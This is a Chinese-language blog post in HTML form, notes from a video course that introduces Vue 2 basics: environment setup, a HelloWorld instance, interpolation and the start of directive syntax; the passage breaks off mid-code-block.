<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vue基本使用 | 吕小布の博客</title><meta name="keywords" content="吕小布的博客"><meta name="author" content="Sai"><meta name="copyright" content="Sai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[TOC] 教程链接：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1Zy4y1K7SH 课程简介vue2 + vue3  vue基础 vue-cli vue-router vuex element-ui vue3  1.vue核心1.1.vue简介1.1.1.vue官网使用指南 教程：https:&#x2F;&#x2F;cn.vuejs.org&#x2F;v2&#x2F;guide&#x2F;  入门教程   api：htt">
<meta property="og:type" content="article">
<meta property="og:title" content="Vue基本使用">
<meta property="og:url" content="http://mindcons.cn/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/index.html">
<meta property="og:site_name" content="吕小布の博客">
<meta property="og:description" content="[TOC] 教程链接：https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1Zy4y1K7SH 课程简介vue2 + vue3  vue基础 vue-cli vue-router vuex element-ui vue3  1.vue核心1.1.vue简介1.1.1.vue官网使用指南 教程：https:&#x2F;&#x2F;cn.vuejs.org&#x2F;v2&#x2F;guide&#x2F;  入门教程   api：htt">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2022/07/02/xjocPR8fnLu64KU.png">
<meta property="article:published_time" content="2022-07-25T12:30:40.000Z">
<meta property="article:modified_time" content="2022-07-25T13:09:40.505Z">
<meta property="article:author" content="Sai">
<meta property="article:tag" content="吕小布的博客">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/07/02/xjocPR8fnLu64KU.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mindcons.cn/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":350},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Vue基本使用',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-07-25 21:09:40'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2022/07/02/xjocPR8fnLu64KU.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">66</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-search"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/comics/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 互动</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/sponsorWall/"><i class="fa-fw fas fa-money-check-alt"></i><span> 赞助墙</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-coffee"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/course/"><i class="fa-fw fas fa-book"></i><span> 搭建教程</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">吕小布の博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-search"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/comics/"><i class="fa-fw fas fa-video"></i><span> 番剧</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 互动</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/sponsorWall/"><i class="fa-fw fas fa-money-check-alt"></i><span> 赞助墙</span></a></li><li><a class="site-page child" href="/comments/"><i class="fa-fw fas fa-comments"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-coffee"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/course/"><i class="fa-fw fas fa-book"></i><span> 搭建教程</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vue基本使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-25T12:30:40.000Z" title="发表于 2022-07-25 20:30:40">2022-07-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-07-25T13:09:40.505Z" title="更新于 2022-07-25 21:09:40">2022-07-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vue基本使用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>[TOC]</p>
<p>教程链接：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Zy4y1K7SH">https://www.bilibili.com/video/BV1Zy4y1K7SH</a></p>
<h1 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h1><p><code>vue2 + vue3</code></p>
<ul>
<li><code>vue基础</code></li>
<li><code>vue-cli</code></li>
<li><code>vue-router</code></li>
<li><code>vuex</code></li>
<li><code>element-ui</code></li>
<li><code>vue3</code></li>
</ul>
<h1 id="1-vue核心"><a href="#1-vue核心" class="headerlink" title="1.vue核心"></a>1.<code>vue</code>核心</h1><h2 id="1-1-vue简介"><a href="#1-1-vue简介" class="headerlink" title="1.1.vue简介"></a>1.1.<code>vue</code>简介</h2><h3 id="1-1-1-vue官网使用指南"><a href="#1-1-1-vue官网使用指南" class="headerlink" title="1.1.1.vue官网使用指南"></a>1.1.1.<code>vue</code>官网使用指南</h3><ul>
<li><p>教程：<a target="_blank" rel="noopener" href="https://cn.vuejs.org/v2/guide/">https://cn.vuejs.org/v2/guide/</a></p>
<ul>
<li>入门教程</li>
</ul>
</li>
<li><p><code>api</code>：<a target="_blank" rel="noopener" href="https://cn.vuejs.org/v2/api/">https://cn.vuejs.org/v2/api/</a></p>
<ul>
<li>api是在实际开发中，遇到问题去查阅时，逐渐熟悉的</li>
</ul>
</li>
<li><p><code>vue</code>风格指南：<a target="_blank" rel="noopener" href="https://cn.vuejs.org/v2/style-guide/">https://cn.vuejs.org/v2/style-guide/</a></p>
</li>
</ul>
<h3 id="1-1-2-介绍与描述"><a href="#1-1-2-介绍与描述" class="headerlink" title="1.1.2.介绍与描述"></a>1.1.2.介绍与描述</h3><p>基本概念：一套用于<code>构建用户界面</code>的<code>渐进式</code>Javascript框架</p>
<p>我的理解：</p>
<ul>
<li>把数据给vue，vue给你界面</li>
<li>何谓渐进式：根据项目的复杂程度，引入不同的库（逐渐递进）<ul>
<li>简单应用：只需一个轻量小巧的核心库</li>
<li>复杂应用：可以引入各式各样的<code>vue</code>插件</li>
</ul>
</li>
</ul>
<p>发展历史：</p>
<p>作者：<code>Evan You</code></p>
<ul>
<li>2013年，受到<code>Angular</code>框架的启发，尤雨溪开发出了一款轻量框架——<code>Seed</code>。同年12年，<code>Seed</code>更名为<code>Vue</code>，版本为0.6.0</li>
<li>2014年，<code>Vue</code>正式对外发布，版本号0.8.0。<code>Taylor otwell</code>在<code>Twitter</code>上发布动态，说自己正在学习<code>Vue.js</code></li>
<li>2015年，10月27日，正式发布<code>Vue1.0.0 Evangelion</code>（新实际福音战士）</li>
<li>2016年，10月1日，正式发布<code>Vue2.0.0 Ghost in the shell</code>（攻壳机动队）</li>
<li>2020年，9月18日，正式发布<code>Vue3.0.0 One Piece</code>（海贼王）</li>
</ul>
<p>我的理解：</p>
<ul>
<li>后起之秀，生态完善，已成为国内前端工程师必备技能</li>
</ul>
<h3 id="1-1-3-vue的特点"><a href="#1-1-3-vue的特点" class="headerlink" title="1.1.3.vue的特点"></a>1.1.3.<code>vue</code>的特点</h3><ul>
<li>采用组件化模式，提高代码复用率，且代码更好维护</li>
<li>声明式编码，让编码人员无需直接操作<code>DOM</code>，提高开发效率</li>
</ul>
<h3 id="1-1-4-搭建vue开发环境"><a href="#1-1-4-搭建vue开发环境" class="headerlink" title="1.1.4.搭建vue开发环境"></a>1.1.4.搭建<code>vue</code>开发环境</h3><ul>
<li>直接下载并用 <code>&lt;script&gt;</code> 标签引入：</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> =<span class="string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>引入后，<code>Vue</code> 会被注册为一个全局变量，全局会多了一个<code>Vue</code>的构造函数。</p>
<p>可以在控制台输出</p>
<p>开发版本：<a target="_blank" rel="noopener" href="https://cn.vuejs.org/js/vue.js">https://cn.vuejs.org/js/vue.js</a></p>
<p>生产版本：<a target="_blank" rel="noopener" href="https://cn.vuejs.org/js/vue.min.js">https://cn.vuejs.org/js/vue.min.js</a></p>
<ul>
<li>下载<code>vuedevtools</code>，可以搜索直接下载插件</li>
<li>修改<code>Vue.config</code>配置，关掉控制台关于生产环境的提示</li>
</ul>
<p><code>Vue.config.productionTip</code>，设置为 <code>false</code> 以阻止 vue 在启动时生成生产提示。</p>
<h2 id="1-2-初识vue"><a href="#1-2-初识vue" class="headerlink" title="1.2.初识vue"></a>1.2.初识<code>vue</code></h2><h3 id="1-2-1-HelloWorld小案例"><a href="#1-2-1-HelloWorld小案例" class="headerlink" title="1.2.1.HelloWorld小案例"></a>1.2.1.<code>HelloWorld</code>小案例</h3><ul>
<li><p>vue帮我们构建界面，界面放在哪个位置呢？</p>
<ul>
<li><p>需要准备一个容器（一个dom节点）</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>容器内部不应该写任何东西</p>
<ul>
<li><p>但我们先写点东西在里面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>通过<code>new</code>调用全局的<code>Vue</code>构造函数，创建<code>Vue</code>的实例对象</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建Vue实例</span></span><br><span class="line"><span class="keyword">const</span> x = <span class="keyword">new</span> <span class="title class_">Vue</span>()</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建<code>Vue</code>实例时，有个问题，需不需要传参数，传几个呢？</p>
<ul>
<li><code>Vue</code>的构造函数只接受一个参数，参数类型为对象</li>
<li>这种对象，一般称为<code>配置对象</code><ul>
<li><code>key</code>一般都是固定的</li>
</ul>
</li>
</ul>
</li>
<li><p><code>Vue</code>构造函数的的第一个配置：<code>el</code>，用于指定当前<code>Vue</code>实例为哪个容器服务</p>
<ul>
<li>值通常为<code>css选择器字符串</code>，<code>Vue</code>实例自己去找</li>
<li>也可以通过<code>document.getElementById</code>找到后，再传给<code>Vue</code>实例</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	<span class="attr">el</span>: <span class="string">&quot;#root&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>el</code>配置，指定<code>id</code>为<code>root</code>的容器，被<code>Vue</code>实例管理<ul>
<li>我的理解：拿到<code>dom</code>节点对象传给<code>js</code>（<code>Vue</code>实例），后续数据渲染结果，都基于该<code>dom</code>节点对象</li>
</ul>
</li>
<li>此时<code>Vue</code>实例对象通过<code>el</code>管理容器后，但我们还没有用到<code>Vue</code></li>
</ul>
</li>
<li><p>需求：界面显示的<code>Hello</code>不变，但<code>World</code>是变化的</p>
<ul>
<li><p>我们把容器里面，变化的数据，交给<code>Vue</code>实例来保管</p>
</li>
<li><p>只需要维护好数据，省去了自己操作<code>dom</code></p>
</li>
<li><p>使用<code>data</code>配置项，存储数据，供<code>el</code>指定的容器使用（容器外面使用，是没用的），值暂时写为一个对象</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 存储用户自定义数据</span><br><span class="line">// 值暂时写为一个对象</span><br><span class="line">data: &#123;</span><br><span class="line">	name : &#x27;xiaoming&#x27;,</span><br><span class="line">	age: 18</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>容器怎么拿到，存在<code>data</code>配置项里面的数据呢？</p>
<ul>
<li><p>使用<code>插值</code>语法：<code>&#123;&#123;name&#125;&#125;</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> =<span class="string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>: <span class="string">&quot;#root&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>页面效果：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220402164107644.png" alt="image-20220402164107644"></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>并不需要一个变量，来存储<code>Vue</code>实例对象，直接<code>new Vue()</code>即可</p>
</li>
</ul>
<h3 id="1-2-2-小结：分析Helloworld小案例"><a href="#1-2-2-小结：分析Helloworld小案例" class="headerlink" title="1.2.2.小结：分析Helloworld小案例"></a>1.2.2.小结：分析<code>Helloworld</code>小案例</h3><ul>
<li>想让<code>Vue</code>工作，就必须创建一个<code>Vue</code>实例，且要传入一个配置对象</li>
<li><code>root</code>容器里面的代码依然符合<code>html</code>规范，只不过混入了一些特殊的<code>Vue</code>语法</li>
<li><code>root</code>容器里面的代码被称为<code>Vue模板</code><ul>
<li>模板的解析流程：先有的容器，然后有<code>Vue</code>实例，当<code>Vue</code>实例开始工作时，读取<code>el</code>配置，拿到了容器</li>
<li><code>Vue</code>实例开始解析包含<code>Vue</code>特殊语法的字符集，用<code>data</code>里的数据进行替换<code>Vue</code>设计的特殊语法</li>
<li>最后生成全新的<code>id</code>为<code>root</code>的<code>html</code>片段，替换掉之前的容器，重新放到页面上</li>
<li>容器的作用<ul>
<li>为<code>Vue</code>实例提供模板</li>
<li>给<code>Vue</code>的解析结果提供一个呈现的位置</li>
</ul>
</li>
</ul>
</li>
<li>真实开发中只有一个<code>Vue</code>实例，并且会配合着组件一起使用</li>
<li>差值语法中要写<code>js</code>表达式，差值语法可以读取到<code>data</code>中的所有属性</li>
<li><code>data</code>中的数据发生变化时，所有用到这些数据的页面，也会全部更新</li>
<li>注意区分：<code>js</code>表达式和<code>js</code>代码（语句）<ul>
<li><p>表达式：一个表达式会生成一个值，可以放在任何一个需要值的地方</p>
<ul>
<li><code>a</code></li>
<li><code>a+b</code></li>
<li><code>demo(1)</code></li>
<li><code>x === y ? &#39;a&#39; : &#39;b&#39;</code></li>
</ul>
</li>
<li><p><code>js</code>代码（语句）</p>
<ul>
<li><code>if()&#123;&#125;</code></li>
<li><code>for()&#123;&#125;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="1-3-模板语法"><a href="#1-3-模板语法" class="headerlink" title="1.3.模板语法"></a>1.3.模板语法</h2><h3 id="1-3-1-效果"><a href="#1-3-1-效果" class="headerlink" title="1.3.1.效果"></a>1.3.1.效果</h3><p>差值语法</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>差值语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">name</span>: <span class="string">&#x27;jack&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220510213057593.png" alt="image-20220510213057593"></p>
<p>指令语法</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>指令语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>跳转<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220510213158109.png" alt="image-20220510213158109"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span 